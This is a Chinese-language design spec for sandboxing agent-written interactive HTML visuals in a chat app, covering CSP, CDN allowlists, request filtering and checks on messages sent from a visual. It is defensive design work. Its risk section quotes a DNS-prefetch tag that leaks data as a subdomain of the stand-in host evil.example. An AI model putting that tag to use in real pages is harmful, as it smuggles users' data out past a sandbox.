# SPEC-0007：对话里的交互演示

- **状态**：评审中
- **创建**：2026-11-05
- **更新**：2026-11-10（ML4：学习方向的演示目录、相对路径按方向现在的目录算、按方向 resolve、查看标签里的演示没有回传，见"MV1 实现时定的细节"末尾和 SPEC-0008"ML4 定的细节"）；2026-11-05（用户定：演示内联在消息流里；演示里点的回答直接发出、不弹确认；库走 CDN 白名单；做成所有会话都能用的通用能力；CDN 只许写死版本的路径；同时加载不设上限；样式不设清单；Hugeicons 只放常用的；焦点在演示里时按键归演示）
- **相关**：[SPEC-0008 学习模式](0008-study-mode.md)（第一个用它的地方）、[plugin-model.md · HTML 设计稿](../architecture/plugin-model.md#待做的插件html-设计稿)（同一个沙箱底座）、[security.md](../architecture/security.md)、[design-language.md](../architecture/design-language.md)、调研 [inline-visuals.md](../research/inline-visuals.md)（Codex Visualize 的做法）、原型 `prototypes/study-mode-visuals-prototype.html`

## 背景与目标

有些东西光靠文字和静态图讲不清：有先后、有状态变化、能调条件对比的，比如两个事务交错执行、请求怎么过中间件、算法一步步怎么走。现在 Atrium 的回复能渲染 Markdown、代码、Mermaid 和公式，但不能跑模型写的 HTML（security.md：回复里的原始 HTML 一律不执行）。

Codex 的 Visualize 插件做了这件事：模型写一个 HTML 片段存成文件，回复里放一行引用，宿主在那个位置把它放进沙箱 iframe 内联显示，片段里的按钮还能替用户发一条消息。

目标：所有会话都能让 agent 在回复里内联显示一个可交互的演示；演示跑在沙箱里，碰不到宿主和对话；演示里你点的回答能直接交给 agent。学习模式先用起来。

## 非目标

- HTML 设计稿的标注、版本回退、分享（plugin-model.md 里那个插件；它以后复用这里的沙箱）。
- 演示状态的保存和恢复（Codex 的 `widgetState`），第一版每次打开从头开始。
- 演示联网取数据、调用接口。
- 图片生成。
- 手机端渲染演示（手机端只显示一张"在电脑上查看"的卡片，见"手机端"）。
- 演示放在右栏或单开标签（原型里对比过，2026-11-05 用户选了内联）。
- 把 CDN 上的库缓存到本地供离线打开（2026-11-05 用户定不做）。

## 需求

1. 当 agent 讲一个有动态过程的概念时，我希望它在回复里放一个能一步步点、能切换条件的演示，而不是只给我一段文字。
2. 当我在演示里点了一个回答，我希望它直接作为我的消息发给 agent，agent 接着讲。
3. 当 agent 改了演示，我希望对话里看到的是改过的版本。
4. 我希望演示跟着 Atrium 的深浅色和字体走，看起来是 Atrium 的一部分。
5. 我希望演示就算被提示注入写坏了，也读不到我的对话、文件和凭据，发不出网络请求，也不能自己替我发消息。
6. 以后复习时，我希望还能打开当时的演示。

## 方案设计

### 一个演示 = 一个文件 + 回复里的一个引用

- agent 把演示写成一个 **HTML 片段**文件（不带 `<!doctype>`、`<html>`、`<head>`、`<body>`），放在宿主给的目录里：
  - 学习方向的会话：方向现在的目录下的 `visuals/`（SPEC-0008；归档的方向是 `Archive/` 下的那份），引用写相对路径 `visuals/<级>-<步>-<名字>.html`（ML4）。
  - 其他会话：`~/.atrium/visuals/<会话 id>/`，不放进工作区，免得弄脏仓库（plugin-model.md"文件放哪"）。
- 回复里在要显示的位置放一个代码块，语言是 `visual`，内容是一行 JSON：

  ````text
  ```visual
  {"path":"visuals/2-03-isolation.html"}
  ```
  ````

  `path` 是相对会话工作目录的路径，或者宿主给的目录下的绝对路径。用代码块而不是 Codex 那样的裸行：Streamdown 本来就按语言分派代码块（Mermaid 也是这样），不认识这个语言的地方（旧版本、导出的记录）会原样显示成一段代码，不会变成乱码。
- 改演示：agent 用普通的编辑工具在原文件上改，再在这一轮的回复里放一次引用。对话里**所有指向这个文件的卡片都显示最新内容**，文件变了就重新加载（plugin-model.md"实时刷新"）。
- 宿主只认这两类目录下的 `.html` 文件；路径越界、文件不存在、超过 1 MB，卡片显示错误码对应的提示，不加载。

### 怎么让 agent 知道

Atrium 自带的 pi 扩展（ADR-0008）在系统提示里加一段英文说明（同其他 Atrium 工具的写法）：

- 演示目录在哪（扩展按会话所在的容器算出来）。
- 片段的规矩：不用 `fetch`、XHR、WebSocket；根元素给唯一 id；小于 1 MB；只能从 CDN 白名单加载库，地址里必须写死完整版本号（不写的会被拦）；建议用宿主给的颜色变量，这样深浅色会跟着变，但不强制；样式自己写。
- 什么时候用：有先后或状态变化、要调条件对比的才做；静态结构用 Mermaid，表格用 Markdown 表格；正文里不提"我写了一个 HTML"之类的实现细节。
- 回传的写法（见下文"回传"）。

具体到某个容器的规则（比如学习模式"每节最多一个演示""最多一个先猜的问题"）写在容器自己的 AGENTS.md 里，不放进通用说明。学习模式另外在上课、费曼的学习提示（`atrium_study`，不是这里的通用说明）里再写一遍，已经建好的方向也拿得到；两处说法一样，你改过 AGENTS.md 时以它为准（SPEC-0008"ML4 定的细节 · 演示"）。

### 沙箱

照 plugin-model.md"沙箱视图由核心提供"的要求做成核心组件，HTML 设计稿以后也用它：

- **独立的源**：Electron 注册一个自定义协议（暂名 `atrium-visual:`），每个演示一个路径；宿主读文件，套上外壳（见"运行环境"），和 CSP 头一起返回。不用 `srcdoc`（会继承父页面的 CSP）。
- iframe `sandbox="allow-scripts"`，不给 `allow-same-origin`、`allow-popups`、`allow-forms`、`allow-top-navigation`；`referrerpolicy="no-referrer"`；拒绝权限请求（摄像头、麦克风、定位……）。
- CSP（照 Codex，先不开 `'unsafe-eval'`）：

  ```text
  default-src 'none';
  script-src 'unsafe-inline' <CDN 白名单> atrium-visual:;
  style-src 'unsafe-inline' <CDN 白名单> atrium-visual:;
  img-src data: blob: <CDN 白名单>;
  font-src data: <CDN 白名单> atrium-visual:;
  media-src data: blob:;
  worker-src blob:;
  connect-src 'none';
  frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'
  ```

- **CDN 白名单**（2026-11-05 用户定，照 Codex）：`https://cdnjs.cloudflare.com`、`https://cdn.jsdelivr.net`、`https://esm.sh`、`https://unpkg.com`、`https://fonts.googleapis.com`、`https://fonts.gstatic.com`。**只许写死版本的路径**（2026-11-05 用户定）：CSP 管不到路径里的版本，所以演示用单独的 Electron session，宿主在 `webRequest.onBeforeRequest` 里按站点检查地址，不合规的拦下：
  - `cdn.jsdelivr.net`：`/npm/<包>@<x.y.z>/…`、`/gh/<用户>/<仓库>@<版本>/…`，`<版本>` 是完整的 40 位提交号，或 `vX.Y.Z` / `X.Y.Z` 的标签（短提交号也可能是分支名，不算写死，MV1 审查后定）
  - `unpkg.com`：`/<包>@<x.y.z>/…`
  - `esm.sh`：路径里的包名带 `@<x.y.z>`。MV1 实测：esm.sh 给的模块按依赖声明的范围引依赖（`/d3-array@3?target=es2022`、`/base64-js@^1.3.1?target=es2022`），不是写死的版本，演示自己也能写出同样的地址，所以**不放行**；系统提示让模型在 esm.sh 上加 `?bundle`（依赖打进同一个文件）。esm.sh 自己的 Node 垫片 `/node/<名字>.mjs` 不随包变，放行。依赖范围照旧拦下（2026-11-06 用户定）。
  - `cdnjs.cloudflare.com`：`/ajax/libs/<名字>/<x.y.z>/…`
  - 字体的两个站点不带版本，照放。
  - 拦下的请求在演示里就是加载失败；日志只记被拦的次数和站点，不记完整地址。
- **离开视口时卸载**，换成最后一次的截图；滚回来再加载（plugin-model.md）。视口里的演示同时加载几个**不设上限**（2026-11-05 用户定）。
- **截图怎么截**：演示完整在视口里、并且停下来 1 秒没有操作和高度变化时，宿主用 `webContents.capturePage(iframe 所在的矩形)` 截一张，只放内存、不写盘，每个演示只留最新一张。离开视口时换成这张图，大小不变；还没截到时显示一张同样高度的占位卡（演示的标题）。
- **高度**：片段的外壳用 `ResizeObserver` 量高度，经 postMessage 报给宿主，宿主设 iframe 高度，上限 10 000px，超过就让 iframe 自己滚动（同 Codex）。宽度跟消息流一样宽。

### 运行环境

宿主给每个片段套一个固定的外壳，片段只写内容：

- **颜色变量**：外壳提供一组颜色变量，从 design-language.md 的 token 映射，深浅色切换时宿主推一条消息，外壳换掉变量值。**不定清单、不强制用**（2026-11-05 用户定）：模型自己写样式，想跟着深浅色变就用这些变量。
- **字体和字号**跟 Atrium 一致。
- **图标**：外壳里带一份**常用的** Hugeicons（2026-11-05 用户定，不放全部；项目规定的界面图标，见 design-language.md），先从 Atrium 界面已经用到的图标里取，再补方向、播放、对错、加减这类演示常用的，名单放在代码里，系统提示列出可用的名字。片段用 `<i data-icon="名字">` 占位，外壳替换成 SVG；名单外的名字显示为空。不许自己画图标或从网络加载图标库。
- **键盘**：焦点在演示里时，按键归演示（2026-11-05 用户定）：Atrium 界面里的快捷键不响应；只有 macOS 菜单上的（⌘Q、⌘W、⌘,）照常。点演示外面焦点就回到 Atrium。
- **桥**：外壳在 `window.atrium` 上提供 `sendMessage(text)`（见"回传"），其他什么都没有。

### 回传

- 片段调用 `window.atrium.sendMessage(text)`：外壳先检查 `navigator.userActivation.isActive`（你刚在演示里点过），不是就丢掉；是就把文字经 postMessage 发给宿主。消息格式照 MCP Apps（SEP-1865）的 JSON-RPC（`ui/message`），以后同一个渲染器也能显示 MCP 服务器带的界面。
- 宿主收到后**直接发出**，不弹确认框（2026-11-05 用户定，Codex 会弹）：当作你在这个会话里发的一条消息，正在运行时按插话处理（同输入框）。
- 这条消息在记录里带来源：消息气泡前面有"来自演示"的标记（原型第 3 屏）。来源记在宿主的插话记录旁边（`turns/<会话 id>.json`），不改 pi 的消息内容。
- 限制：一条最多 4 000 字符；同一个演示两次发送至少隔 1 秒；超出的丢掉，日志只记次数，不记内容。
- 演示**不能**读对话、读文件、调工具、改输入框，也收不到 agent 的回复。

### 手机端

手机端（SPEC-0005）的消息流遇到 `visual` 代码块，显示一张卡片：第一行是标题行"演示 · <文件名>"（太长截断），第二行另起"在电脑上查看"，文件名再长也挤不掉这句说明（2026-11-06 用户定，同 design-language）。不渲染，第一版也不经 relay 传 HTML。

## 接口与数据

- **回复里的引用**：语言为 `visual` 的代码块，内容 `{"path": string, "title"?: string}`。
- **协议**：
  - 界面 → 宿主：`visual.resolve { sessionId, path }` → `{ url, size, mtime }` 或错误码（`visual.outside`、`visual.missing`、`visual.too_large`）。
  - 宿主 → 界面：`visual.changed { sessionId, path, mtime }`，宿主监视打开着的演示文件。
  - 界面 → 宿主：`visual.sendMessage { sessionId, path, text }`，宿主按插话或新一轮发出，并记来源。
- **自定义协议**：`atrium-visual://<令牌>/<文件名>`。令牌由宿主为每次 `resolve` 生成、只在当前运行内有效，对应会话和文件，iframe 里拿到的地址不能拿去读别的文件。
- **插话记录**：`turns/<会话 id>.json` 的每条用户消息可以多一个 `source: { kind: "visual", path }`（新增可选字段，不升版本）。
- **扩展**：系统提示里多一段演示说明，带演示目录的路径。

### MV1 实现时定的细节（2026-11-05）

照协议包的命名，名字改成下划线，含义不变：

- `resolve_visual { sessionId, path }` → `{ url, size, mtime }`；错误码 `visual_outside`（不在演示目录里、不是 `.html`、路上有符号链接）、`visual_missing`、`visual_too_large`，会话不存在照常是 `session_not_found`。同一个文件在宿主的一次运行里总是同一个令牌；文件变了，界面在地址后面加 `?v=<mtime>` 重新加载。
- `visual_changed { sessionId, path, mtime }`：只发给 resolve 过这个文件的连接。宿主按文件所在的目录监视（编辑器整份替换文件时，监视单个文件会断），连接断开就停；客户端最后一张卡片放开这个演示时（卡片卸载、查看标签或演示预览关掉）发 `release_visual { sessionId | directionId, path }`，宿主停掉这个连接对它的监视，没有连接在看了就丢掉令牌（2026-11-10 ML4 三方审查后用户定：关掉就放，不等断线；协议 38 加的命令，结果 `{}`，手机 `local_only`）；还在路上的 resolve 遇到同一个演示的放开，回完也不加监视；客户端重连后把还有卡片在用的再 resolve 一遍（卡片卸载就不记了；一次最多 20 个、隔 200 ms 再下一批，不会撞上宿主每秒 200 条的上限；断线没 resolve 成的留着下次再试，失败的也留着，卡片显示原因）。文件被删了也发（`mtime` 为 0），卡片再 resolve 就显示"找不到"；resolve 时还不存在的文件也照样监视（文件夹还没有时监视最近一层已有的上级目录），出现了就发。宿主只留有连接在看的令牌和发送时间，没人看了就丢；同一次运行里有人在看的文件令牌不变。连接断开或宿主关了以后才完成的 resolve 不再加监视（MV1 审查后加）。
- `send_visual_message { sessionId, path, text }` → `{ disposition }`，同 `steer`（运行中是插话，空闲时是新的一轮），另加 `dropped`：同一个演示 1 秒内的第二条（检查文件之前就占住这一秒，两条同时到也只发一条）；界面把 `dropped` 当没发出，演示里的 `sendMessage` 得到 `false`。`text` 最长 4 000 字符，超了是 `invalid_message`，界面先丢掉不发。
- 演示目录由会话所在的容器给：宿主组装时注入"会话 → 演示目录"的函数，默认是 `~/.atrium/visuals/<会话 id>/`，学习方向里的会话（ML4）是方向现在的目录下的 `visuals/`（见本节末尾"学习方向（ML4）"）。扩展经启动参数 `--atrium-visuals=<base64url 的 JSON>` 拿到这个目录（同 `--atrium-agent`），系统提示分段名 `atrium_visuals`。
- **归档方向里的只读会话**（SPEC-0008，2026-11-06 合并 ML1 时定）：演示照常 resolve、显示（只读文件，不起 pi；ML4 起相对路径按方向现在的目录算，这条才做得到，见本节末尾），"来自演示"的标记照样显示；演示里的回传被宿主以 `direction_archived` 拒绝，演示的 `sendMessage` 得到 `false`。
- **分叉和子对话读得到上级会话的演示**（2026-11-06 用户定）：它们带着复制来的历史，里面引用的演示在上级会话的目录里。所以一个会话 resolve 时，路径落在它自己的演示目录，或者沿着索引里记的上级（子对话的 `parent`；脱离后记在 `detachedFrom`）一路往上任何一个会话的演示目录里，都算在演示目录里。只读、不复制文件；新写的演示仍然进自己的目录。上级链有环也只走一遍；和它没有上下级关系的会话的目录照样是 `visual_outside`。
- 演示 frame 的导航只许到 `atrium-visual:`（不许导航到 CDN 上的页面、`data:`、`blob:`，那里没有演示的 CSP，MV1 审查后加）。演示里再开的 frame：`data:`、`blob:`、带地址的都按导航被请求过滤拦下；`srcdoc` 和 `about:blank` 不经过请求，`will-frame-navigate` 也看不到 `srcdoc`（实测），而 `srcdoc` 子 frame 自己跑脚本、有一份新的 `RTCPeerConnection`（MV1 三方审查发现，`frame-src 'none'` 管不到）。所以预加载脚本在每个 frame 里都跑（`nodeIntegrationInSubFrames`，仍然没有 Node）：应用页面拿到桥，别的 frame 只在自己的脚本跑之前被拿掉所有 `RTC*`、`webkitRTC*`（同外壳里那一步）。请求过滤里没有 frame 的请求（主进程自己的、Worker 的）也按名单放行：应用页面和宿主的源、`atrium-visual:`、`data:`、`blob:`、白名单站点里写死版本的地址，别的一律拦下；重定向的每一跳都再查一次。演示的 `window.open` 被 iframe 的 sandbox 挡在渲染进程里，到不了主进程的 `setWindowOpenHandler`（e2e 实测，系统浏览器没被叫起）。DNS 预解析：演示的响应带 `X-DNS-Prefetch-Control: off`；e2e 用 net-log 实测，演示里的 preconnect、prefetch、链接都不解析，但 `<link rel="dns-prefetch">` 照样解析（Chromium 按 frame 的设置决定，不看这个头，Electron 没有关掉它的办法），2026-11-06 用户定作为已知的残余风险接受，见"风险与待定问题"。被拦的请求在主进程 stderr 只记总数（站点名可能就是模型编进去的数据）。WebRTC：演示用不上，整个关掉（2026-11-06 用户定）。外壳的桥在片段之前运行，把演示 frame 全局上所有 `RTC*`、`webkitRTC*` 构造函数换成不可配置、不可写的 `undefined`，片段删不掉也装不回；演示里再开的 `about:blank` 子 frame 是另一个不透明源，拿不到它的全局；Worker 里没有 `RTCPeerConnection`，`RTCDataChannel` 不能直接构造。窗口另设 `disable_non_proxied_udp`。STUN/UDP 和 TURN over TCP 都连不出去（e2e 实测）。
- 片段经宿主的 HTTP 端口 `/visual/<令牌>/<文件名>` 提供（只认令牌，文件名只是给人看的），Electron 主进程把 `atrium-visual://<令牌>/<文件名>` 转发过去并换上 CSP，同 `atrium://app`。宿主自己的响应头也带同一份 CSP，再加 `sandbox allow-scripts`：直接用浏览器打开这个地址，片段也是不透明源，连不上宿主。单独运行的宿主（浏览器里开界面）没有 `atrium-visual:`，卡片显示加载失败（2026-11-06 用户确认）。
- **单独的 Electron session 做不到，换成按 frame 过滤**（2026-11-06 用户确认）：iframe 和它所在的页面属于同一个 webContents，Electron 的 session 是按 webContents 分的，不能给一个 iframe 单独的 session；要单独的 session 只能用 `<webview>`（security.md 没开）或盖在消息流上的 WebContentsView（滚动、裁剪要自己算，`capturePage(iframe 的矩形)` 也是按 iframe 在窗口里写的）。所以在默认 session 的 `webRequest.onBeforeRequest` 里看发起请求的 frame：不是应用页面本身的（演示 iframe；Worker 的请求没有 frame，见上一条），只放行 `atrium-visual:`、`data:`、`blob:` 和白名单站点里写死版本的地址，其他一律拦下，包括演示把自己导航到别的地址。应用页面自己的请求不受影响。效果和 SPEC 要的一样。
- **"刚点过"在界面再查一次**：外壳里的检查挡不住片段自己调 `postMessage`（它们在同一个 JS 环境里），所以界面收到 `ui/message` 时再查：这个 iframe 是当前的焦点元素，并且页面的 `navigator.userActivation.isActive` 为真（Chromium 把子 frame 的激活传给上层）。实现和审查时发现片段能用脚本把焦点移进自己（`element.focus()`），借走 Atrium 里打字的激活，或者另一个演示刚被点的激活，所以在桌面端再要一条：主进程把窗口里每次按下鼠标的位置（`input-event`，含 frame 里的）告诉页面，页面在**收到的那一刻**用 `elementFromPoint` 看按在了哪个元素上，记下"按在了这个 iframe 上"；`ui/message` 要有 5 秒内（Chromium 用户激活的时长）、按在这个 iframe 上、还没用过的一次按下，一次按下最多发一条。按在被消息区裁掉、盖在输入框下面的那部分不算（那里最上面的是输入框），按下之后滚动、换位置也不会让另一个演示借走。其他条件都过了才用掉这次按下，格式不对、没有焦点的消息不会把它耗掉。按下的通知和消息谁先到不一定，消息先到时等最多 300 ms。键盘（Tab 进演示再按回车）因此发不出，要鼠标按下（2026-11-06 用户确认）。没有桌面端时（浏览器里开界面）退回：页面自己 5 秒内有点按或按键就不收。
- 和外壳之间的消息照 MCP Apps 的 JSON-RPC：外壳发 `ui/initialize`，界面回主题（`theme` 和 `styles.variables`）；深浅色变了发 `ui/notifications/host-context-changed`；外壳报高度 `ui/notifications/size-changed`；回传 `ui/message`（`{ role: "user", content: { type: "text", text } }`）。截图要知道演示有没有在被操作，外壳另报 `atrium/notifications/activity`（不是 MCP Apps 的）。
- 颜色变量（不强制用）：`--surface-1`～`--surface-3`、`--code`、`--text`、`--text-2`、`--text-3`、`--text-muted`、`--text-dim`、`--line`、`--line-soft`、`--line-strong`、`--hover`、`--selected`、`--tint`、`--on-tint`、`--attn`、`--danger`、`--ok`、`--diff-add-bg`、`--diff-del-bg`，以及 `--font-sans`、`--font-mono`、`--fs`、`--fs-sm`、`--fs-xs`、`--r-sm`、`--r`、`--r-md`；值从界面当时的 token 读出来。主题到之前外壳先不显示（最多 300ms）。
- 图标名单在 `packages/pi/src/visuals/`，系统提示照它列名字；SVG 由宿主按名单从 Hugeicons 取。
- 来源：`Turn.user.source` 是可选字段，来自演示时为 `{ kind: "visual", path }`，否则没有这个字段（不写 `null`，照协议代码）；插话记录里是 `sources: { <条目 id>: { kind, path } }`。**运行中送达、成了一轮里的"插话"步骤的，第一版不标来源**，只有开了新一轮的才标（2026-11-06 用户确认）。
- 截图只存在界面内存里（不落盘），按演示地址最多留 64 个、只留每个最新的一张，最久没用的先丢（2026-11-06 用户确认）；另外总共不超过 32 MB（按 `data:` 地址的长度算），超了也从最久没用的丢。卡片不另存一份，丢了就换回占位卡。截图记着截的时候是深色还是浅色，主题换了旧图不用，回到视口再截。截之前看 frame 的四角和中心最上面是不是 frame 自己，被菜单、弹窗盖住时不截（MV1 审查后加）。
- 加载失败：frame 加载后 10 秒内外壳没发 `ui/initialize`（文件在加载前没了、协议出错、浏览器里开界面没有 `atrium-visual:`），卡片换成"演示加载失败"。卡片从失败恢复后，视口观察跟着新的元素。
- ⌘W、⌘,：焦点在演示里时页面收不到按键，所以由主进程在 `before-input-event` 里接住这两个键，告诉页面关标签、开设置，和页面自己收到时做的一样（SPEC 正文"键盘"一条，MV1 审查后补）。
- 标题行右端"在查看标签里打开"：查看标签只读工作区里的文件，所以只在 `path` 是相对路径、会话有工作区时显示；默认目录 `~/.atrium/visuals/` 不在工作区里，这个按钮不出现（2026-11-06 用户确认）。ML4 起方向里的会话也有（见下）。
- **学习方向（ML4，2026-11-10，SPEC-0008"ML4 定的细节"）**：
  - 方向里所有会话的演示目录是**方向现在的目录**下的 `visuals/`（归档的方向是 `Archive/<目录名>/visuals/`），宿主不建，agent 第一次写演示时建。`--atrium-visuals` 的 JSON 多一个可选的 `relative: "visuals"`（版本不变），扩展据此让模型写 `visuals/<级>-<步>-<名字>.html`、引用写这个相对路径；别的会话照旧写绝对路径。
  - resolve 方向里会话的引用：相对路径按方向现在的目录算，不按会话记录里的 `cwd`（方向归档、恢复时整个目录搬走了，记录里的 `cwd` 不改）；绝对路径落在记录的 `cwd` 下面的，换算到现在的目录再查。上级会话的演示目录照旧也算（方向里的上下级用的是同一个 `visuals/`）。
  - `visuals/` 必须是真目录：`lstat` 不是链接，`realpath` 的上一层就是方向目录的 `realpath`；方向目录本身也要是学习目录（或 `Archive/`）下一层的真目录。不合都是 `visual_outside`。默认目录 `~/.atrium/visuals/<id>/` 由宿主管、照旧允许经链接到达（家目录是链接的情况），方向的 `visuals/` 在 agent 的工作目录里、它能换成链接，所以不一样。
  - 按方向 resolve：`resolve_visual` 改成 `{ sessionId, path }` 和 `{ directionId, path }` 二选一（协议 39，任务图先占了 38）；按方向时 `path` 只认 `visuals/` 下一层的 `.html`，不走上级会话，方向不存在 `direction_not_found`。令牌对应"谁在看"和文件，同一个文件按会话和按方向拿到的令牌不同。`visual_changed` 带上 resolve 时的来源（`sessionId` 或 `directionId`），只发给按这个来源 resolve 过的连接。手机带方向 id 按 `local_only` 拒绝。
  - **查看标签里的演示没有回传**：方向主页的档案、笔记里的链接、方向会话里演示卡片的"在查看标签里打开"，打开的都是查看标签里的演示，按方向 resolve，不属于任何会话；演示里的 `sendMessage` 一律得到 `false`，界面不发 `send_visual_message`。查看标签里一句"在这里点的不会发到对话"。`visuals/` 下的文件不给"在浏览器打开"（那样演示会跑在沙箱外面、能联网）。
  - "在查看标签里打开"：方向会话里，`path` 是相对路径、或换算后落在方向的 `visuals/` 里时显示，打开这个方向的查看标签（渲染，没有回传）。
  - 回传照旧：方向归档后 `direction_archived`；方向里归档了的会话（SPEC-0008 ML3）`session_not_found`。

## 备选方案

- **引用写成裸行（Codex 的 `visualize{…}`）**：解析要另写一层，不认识它的地方会显示一行看不懂的文字。不用。
- **用工具调用（`show_visual`）而不是回复里的引用**：位置只能落在工具调用那里，没法放在一段话中间；模型改完文件还要再调一次。不用。
- **库由宿主内置、不走 CDN**：离线也能打开、只审一次，但能用的库少，模型容易去加载没内置的库。2026-11-05 用户定走 CDN。
- **放在右栏或单开标签**：原型乙、丙。用户选了内联。
- **点回答前弹确认框**：Codex 的做法。用户定直接发，靠"刚点过"的检查防止演示自己发消息。

## 风险与待定问题

- [x] **DNS 预解析**（MV1 三方审查后实测；2026-11-06 用户定：作为已知的残余风险接受，不改代码）：演示里的 `<link rel="dns-prefetch" href="//<数据>.evil.example">` 会让 Chromium 去解析这个域名。漏出去的只有域名本身，经 DNS 查询到对方的权威 DNS 服务器：不发 HTTP 请求、没有请求体、拿不到任何回应，演示也读不到解析结果。接受的理由：Chromium 按 frame 的设置决定、不看 `X-DNS-Prefetch-Control`，Electron 没有开关；整个应用用 `--host-resolver-rules` 只许解析白名单域名会弄坏回复里的远程图片；而 agent 本身用工具就能联网，这条通道不比它多给什么。以后要堵：把回复里的远程图片改走宿主转发，再给整个应用加解析白名单；或者 Electron/Chromium 有了关掉 frame DNS 预解析的开关时打开它。e2e 用 net-log 断言现状（只有 `dns-prefetch` 那个名字被解析），堵上之后这条断言要跟着改。
- [x] **esm.sh 按范围引的依赖**（2026-11-06 用户定）：照旧拦下，过滤不改。系统提示要求模型永远写死完整版本，esm.sh 上一律加 `?bundle`，让依赖打进同一个文件，不再发按范围的子请求。

- [x] **没网时打不开**：走 CDN 的演示离线会缺库。2026-11-05 用户定：不缓存，离线时演示里缺库的部分就是打不开。
- [x] **CDN 上的代码**：白名单里的地址谁都能发包。2026-11-05 用户定只许写死版本的路径（见"沙箱"）；剩下的风险是写死的那个版本本身有问题，它跑在沙箱里、不能联网、拿不到对话，接受。
- [x] 同时加载几个演示：不设上限（2026-11-05 用户定）。性能不够时再说。
- [x] 主题变量和样式类：不定清单，模型自己写（2026-11-05 用户定）。
- [x] Hugeicons：只放常用的（2026-11-05 用户定）。
- [x] 截图：完整可见并停 1 秒后用 `capturePage` 截 iframe 的矩形（用户让我定，见"沙箱"）。
- [x] 键盘冲突：演示优先（2026-11-05 用户定）。

## 实施计划

1. 自定义协议、外壳和 CSP：先用一个固定的片段跑通，测 CSP 拦得住联网、弹窗、跳转、读父页面。
2. 消息流里认 `visual` 代码块，`visual.resolve`、高度上报、深浅色切换、文件变了重新加载。
3. 回传：`sendMessage`、刚点过的检查、限速、来源标记。
4. 扩展的系统提示，拿真实模型试几次常见的概念。
5. 离开视口卸载、截图替换。
6. 手机端的占位卡片。

## 验证

- CSP 和沙箱：演示里尝试 `fetch`、`new WebSocket`、`window.open`、`top.location`、读 `parent.document`、加载白名单外的脚本、请求摄像头，全都失败（自动化测试）。
- 版本：`d3@7.9.0` 能加载；`d3`、`d3@7`、`d3@latest` 被拦（每个站点各测一条）。
- 焦点在演示里时按 Atrium 的快捷键不触发；点外面以后恢复。
- 回传：脚本自己调 `sendMessage` 被丢掉；真点了才发出；超长、太快的被丢掉；发出的消息带来源标记。
- 路径越界、文件不存在、太大，各显示对应提示。
- 改了文件，所有引用它的卡片都更新。
- 深浅色切换时演示跟着变。
- 自用：学习模式里几节课的演示，看模型写得出、用得上。
